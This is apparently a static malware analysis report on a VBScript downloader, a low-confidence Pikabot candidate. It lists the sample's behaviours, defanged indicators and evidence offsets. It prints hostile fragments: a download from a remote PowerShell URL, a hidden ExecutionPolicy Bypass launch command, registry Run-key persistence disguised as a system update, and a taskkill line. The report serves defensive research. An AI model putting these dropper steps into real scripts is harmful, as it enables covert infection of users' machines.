---
title: "Malware Analysis: Pikabot (candidate) (other · vbe · 72c89b13)"
published: 2026-11-05
draft: false
description: "Malicious (low confidence): Pikabot (candidate) · downloader/loader/dropper · difficulty easy · static analysis only"
tags: ["Pikabot", "downloader", "loader", "dropper"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-05-Pikabot-candidate-72c89b13"
---

> [!WARNING]
> **Verdict: Malicious** · Family **Pikabot (candidate)** (uncertain) · Confidence **low**
> 
> Aliases: Pikabot loader
> 
> The sample is plaintext VBScript that can be read directly; the code fully exposes the flow of downloading and executing remote PowerShell, writing to the user directory, persisting via a registry Run key, and terminating the parent process. The download address, drop paths and persistence key are all hardcoded in the script, not inferred.

## Overview

| Item | Content |
|:--|:--|
| Family | **Pikabot (candidate)** · alias Pikabot loader · _uncertain_ |
| Confidence | **low** |
| Behavior class | downloader · loader · dropper |
| Difficulty | easy |
| First seen | 2026-11-04 15:54:45 |
| Analysis method | Static analysis only |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/72c89b13e16cb569916f078963a85fd5b372c6b32eeb97b4f8d3b33a94b9001c/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Download remote PowerShell</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105, T1071.001</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Create hidden work dirs</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036, T1105</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Randomly named script</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036.005</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Fake system-update copy</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036.005</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Run script hidden</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1059.001, T1564.003</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identity

| Item | Value |
|:--|:--|
| SHA-256 | `72c89b13e16cb569916f078963a85fd5b372c6b32eeb97b4f8d3b33a94b9001c` |
| MD5 | _not recorded_ |
| Size | 5,343 bytes (5.2 KB) |
| Type | other · `vbe` |

## Behavior analysis

**8** behaviors in total, each backed by evidence, and all are statically recoverable.

### 1. Download remote PowerShell payload

`T1105, T1071.001` · Confidence **high** · static

It issues a GET request to hxxps://hartford-consult[.]org/aq.ps1 through MSXML2.XMLHTTP, checks that the HTTP status is 200, and writes the response body into a temporary .ps1 file.

> **Evidence**: string offset 413 m_url = "hxxps://hartford-consult[.]org/aq.ps1"; offset 1733 m_http.Open "GET", m_url, False; offset 2050 CreateTextFile(m_tempPayload, True)
> 
> **Source**: `ev-000001` · `ev-000002`

### 2. Create hidden work dirs

`T1036, T1105` · Confidence **high** · static

Creates the two directories C:\Temp\ and %APPDATA%\WindowsSystem\; the latter uses system environment variable expansion, so the drop path varies per user.

> **Evidence**: offset 468 m_stageDir = "C:\Temp\"; offset 501 ExpandEnvironmentStrings("%APPDATA%") & "\WindowsSystem\"; offset 4550 m_fs.CreateFolder path
> 
> **Source**: `ev-000001` · `ev-000002`

### 3. Randomly named script

`T1036.005` · Confidence **high** · static

It generates C:\Temp\<random>.ps1 from an 8-character random string of upper/lowercase letters and digits to evade detection based on fixed file names; the random source is VBScript Rnd.

> **Evidence**: offset 1357 m_tempPayload = m_stageDir & RandomTag & ".ps1"; offset 4747 pool = "A-Za-z0-9"
> 
> **Source**: `ev-000001` · `ev-000002`

### 4. Fake system-update copy

`T1036.005` · Confidence **high** · static

It copies the downloaded temporary script to %APPDATA%\WindowsSystem\system_update.ps1, disguising the name as a system update component and overwriting any same-named file.

> **Evidence**: offset 1416 m_persistPayload = m_appDataDir & "system_update.ps1"; offset 2426 CopyFile m_tempPayload, m_persistPayload, True
> 
> **Source**: `ev-000001` · `ev-000002`

### 5. Run script hidden

`T1059.001, T1564.003` · Confidence **high** · static

It launches powershell.exe via WScript.Shell.Run with arguments including -WindowStyle Hidden and -ExecutionPolicy Bypass, and window style 0 for full concealment.

> **Evidence**: offset 1479 m_launchCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ..."; offset 2674 m_shell.Run m_launchCmd, 0, False
> 
> **Source**: `ev-000001` · `ev-000002`

### 6. Persist via registry Run key

`T1547.001` · Confidence **high** · static

Through WScript.Shell.RegWrite it writes WindowsSystemUpdate under HKCU\Software\Microsoft\Windows\CurrentVersion\Run, with the value executing the persisted copy through hidden PowerShell, achieving auto-start at user logon.

> **Evidence**: offset 2915 runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"; offset 2986 valueName = "WindowsSystemUpdate"; offset 3146 RegWrite(...)
> 
> **Source**: `ev-000001` · `ev-000002`

### 7. Poll for Office loader process

`T1047, T1057` · Confidence **high** · static

It loops for up to 60 seconds, querying SELECT * FROM Win32_Process WHERE Name = 'AddInProcess32.exe' through WMI every second, and after a hit waits 3 seconds before performing cleanup.

> **Evidence**: offset 3499 ProcessRunning("AddInProcess32.exe"); offset 3943 GetObject("winmgmts:\\.\root\cimv2"); offset 3999 Win32_Process query
> 
> **Source**: `ev-000001` · `ev-000002`

### 8. Kill parent PowerShell process tree

`T1057, T1070.004` · Confidence **high** · static

After detecting AddInProcess32.exe it runs taskkill /im powershell.exe /T to end all PowerShell process trees on the machine, then deletes the temporary script under C:\Temp.

> **Evidence**: offset 4273 m_shell.Run "taskkill /im powershell.exe /T", 0, True; offset 5106 DeleteFile m_tempPayload, True
> 
> **Source**: `ev-000001` · `ev-000002`


## IOC (defanged)

### Network

:::caution
**Pending dynamic verification**: the addresses above come from static analysis; no successful connection or session was observed under the isolated analysis network, so the real C2 responses and payloads remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://hartford-consult[.]org/aq[.]ps1` | 443 | download | static | ⏳ not observed |

### Host

**Dropped paths**

- `C:\Temp\<8-char random alphanumeric>.ps1`
- `%APPDATA%\WindowsSystem\system_update.ps1`

**Registry**

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemUpdate`

### Config

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `hxxps://hartford-consult[.]org/aq.ps1` | yes | static |
| `stage_dir` | `C:\Temp\` | yes | static |
| `install_path` | `%APPDATA%\WindowsSystem\system_update.ps1` | yes | static |
| `persistence` | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemUpdate` | yes | static |
| `launch_command` | `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "<script>"` | yes | static |
| `watchdog_process` | `AddInProcess32.exe` | no | static |
| `encryption_algo` | `none` | no | static |
| `campaign_id` | `-` | no | static |

## What not to claim

:::important
The following conclusions are **easy to misjudge**; keep them in mind when citing this report.

- Do not assert that this file performs process injection merely because the script periodically checks AddInProcess32.exe; if injection occurs, it happens in the PowerShell second stage it downloads, while this file only waits and terminates the parent process.
- aq.ps1 was not retrieved, so the final payload type (ransomware, stealer or RAT) cannot be asserted, nor can the absence of other C2s besides hartford-consult[.]org.
- The script contains no encryption or file-encryption logic, so it should not be classified as ransomware or as a stealer with an encrypted configuration.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Static analysis only |
| Unpacking | no |

**Limitations and pending verification**

1. This format has no isolated dynamic channel and the sample was not executed; all conclusions come from static code and string evidence, and the C2 and persistence are only statically confirmed, pending dynamic review.
2. The download address hxxps://hartford-consult[.]org/aq.ps1 was not retrieved, so the second-stage content, the final payload family and the full C2 infrastructure remain unknown.
3. Family attribution is a low-confidence candidate: the AddInProcess32.exe wait-and-cleanup behavior matches Pikabot-class loaders, but configuration extraction or multi-engine evidence is lacking.
4. The script says nothing about the target process, encryption scheme or communication protocol of the second stage; payload retrieval in an isolated environment with network access is needed for further analysis.

## Evidence index

<details>
<summary>Expand 2 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | string extraction | Extracted 155 ASCII strings, including the download URL, C:\Temp, %APPDATA%\WindowsSystem, the Run key, AddInProcess32.exe and the taskkill command |
| `ev-000002` | evidence.record | Read-only static parsing: confirmed sha256/size/entropy and the pure-ASCII VBScript format, and reconstructed the full execution chain (download → drop → execute → persist → process cleanup) |

</details>

---

_This report's sample is not public; IOCs are defanged and for security research only._
